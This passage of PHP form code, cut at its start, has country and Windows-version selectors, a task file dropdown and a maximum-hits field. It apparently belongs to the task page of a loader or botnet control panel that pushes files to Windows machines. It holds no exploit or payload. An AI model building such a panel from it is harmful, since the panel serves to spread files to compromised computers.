   <option value="TW" <?php if(isset($_GET['edit']) && in_array("TW", $countries_array)){echo 'selected';} ?>>Taiwan</option>
   <option value="TJ" <?php if(isset($_GET['edit']) && in_array("TJ", $countries_array)){echo 'selected';} ?>>Tajikistan</option>
   <option value="TZ" <?php if(isset($_GET['edit']) && in_array("TZ", $countries_array)){echo 'selected';} ?>>Tanzania</option>
   <option value="TH" <?php if(isset($_GET['edit']) && in_array("TH", $countries_array)){echo 'selected';} ?>>Thailand</option>
   <option value="TG" <?php if(isset($_GET['edit']) && in_array("TG", $countries_array)){echo 'selected';} ?>>Togo</option>
   <option value="TK" <?php if(isset($_GET['edit']) && in_array("TK", $countries_array)){echo 'selected';} ?>>Tokelau</option>
   <option value="TO" <?php if(isset($_GET['edit']) && in_array("TO", $countries_array)){echo 'selected';} ?>>Tonga</option>
   <option value="TT" <?php if(isset($_GET['edit']) && in_array("TT", $countries_array)){echo 'selected';} ?>>Trinidad & Tobago</option>
   <option value="TN" <?php if(isset($_GET['edit']) && in_array("TN", $countries_array)){echo 'selected';} ?>>Tunisia</option>
   <option value="TR" <?php if(isset($_GET['edit']) && in_array("TR", $countries_array)){echo 'selected';} ?>>Turkey</option>
   <option value="TM" <?php if(isset($_GET['edit']) && in_array("TM", $countries_array)){echo 'selected';} ?>>Turkmenistan</option>
   <option value="TC" <?php if(isset($_GET['edit']) && in_array("TC", $countries_array)){echo 'selected';} ?>>Turks & Caicos Is</option>
   <option value="TV" <?php if(isset($_GET['edit']) && in_array("TV", $countries_array)){echo 'selected';} ?>>Tuvalu</option>
   <option value="UG" <?php if(isset($_GET['edit']) && in_array("UG", $countries_array)){echo 'selected';} ?>>Uganda</option>
   <option value="GB" <?php if(isset($_GET['edit']) && in_array("GB", $countries_array)){echo 'selected';} ?>>United Kingdom</option>
   <option value="UA" <?php if(isset($_GET['edit']) && in_array("UA", $countries_array)){echo 'selected';} ?>>Ukraine</option>
   <option value="AE" <?php if(isset($_GET['edit']) && in_array("AE", $countries_array)){echo 'selected';} ?>>United Arab Emirates</option>
   <option value="US" <?php if(isset($_GET['edit']) && in_array("US", $countries_array)){echo 'selected';} ?>>United States</option>
   <option value="UY" <?php if(isset($_GET['edit']) && in_array("UY", $countries_array)){echo 'selected';} ?>>Uruguay</option>
   <option value="UZ" <?php if(isset($_GET['edit']) && in_array("UZ", $countries_array)){echo 'selected';} ?>>Uzbekistan</option>
   <option value="VU" <?php if(isset($_GET['edit']) && in_array("VU", $countries_array)){echo 'selected';} ?>>Vanuatu</option>
   <option value="VE" <?php if(isset($_GET['edit']) && in_array("VE", $countries_array)){echo 'selected';} ?>>Venezuela</option>
   <option value="VN" <?php if(isset($_GET['edit']) && in_array("VN", $countries_array)){echo 'selected';} ?>>Vietnam</option>
   <option value="VG" <?php if(isset($_GET['edit']) && in_array("VG", $countries_array)){echo 'selected';} ?>>Virgin Islands (Brit)</option>
   <option value="VI" <?php if(isset($_GET['edit']) && in_array("VI", $countries_array)){echo 'selected';} ?>>Virgin Islands (USA)</option>
   <option value="WF" <?php if(isset($_GET['edit']) && in_array("WF", $countries_array)){echo 'selected';} ?>>Wallis & Futuna Is</option>
   <option value="YE" <?php if(isset($_GET['edit']) && in_array("YE", $countries_array)){echo 'selected';} ?>>Yemen</option>
   <option value="ZM" <?php if(isset($_GET['edit']) && in_array("ZM", $countries_array)){echo 'selected';} ?>>Zambia</option>
   <option value="ZW" <?php if(isset($_GET['edit']) && in_array("ZW", $countries_array)){echo 'selected';} ?>>Zimbabwe</option>
</select></td></tr>
<tr><td>Windows version: </td><td>
<select id="select4" class="demo" name="windows[]" multiple>
   <option value="ALL" <?php if(!isset($_GET['edit']) or in_array("ALL", $windows_array)){echo 'selected';} ?>>ALL PLATFORMS</option>
   <option value="Win10" <?php if(isset($_GET['edit']) && in_array("Win10", $windows_array)){echo 'selected';} ?>>Windows 10</option>
   <option value="Win81" <?php if(isset($_GET['edit']) && in_array("Win81", $windows_array)){echo 'selected';} ?>>Windows 8.1</option>
   <option value="Win8" <?php if(isset($_GET['edit']) && in_array("Win8", $windows_array)){echo 'selected';} ?>>Windows 8</option>
   <option value="Win7" <?php if(isset($_GET['edit']) && in_array("Win7", $windows_array)){echo 'selected';} ?>>Windows 7</option>
</select></td></tr>
<tr><td>Task file: 
</td><td><select name="file">
<?php
while($op = mysqli_fetch_assoc($sql_file)){
$file_id = $op['id'];
$file_name = $op['name'];
$nothing = '';
if(isset($_GET['edit'])){
	$selected_id = $re['file'];
	if($selected_id === $file_id){
		$nothing = 'selected';
	}
}
echo '<option value="'.$file_id.'" '.$nothing.'>'.$file_name.'</option>';
}
?>
</select></td></tr>
<tr><td>Task max. hits: </td><td><input name="mhits" min="100" max="1000000" size="4" type="number" value="<?php if(isset($_GET['edit'])){echo $re['max'];} else {echo '100';} ?>" /></td></tr>
</table>
</div>
<br><input type="submit" class="button" <?php if(isset($_GET['edit'])){echo 'value="Edit Task" name="edit_task"';} else {echo 'value="Add Task" name="add_task"';} ?>  />
</form>
</body>
</html>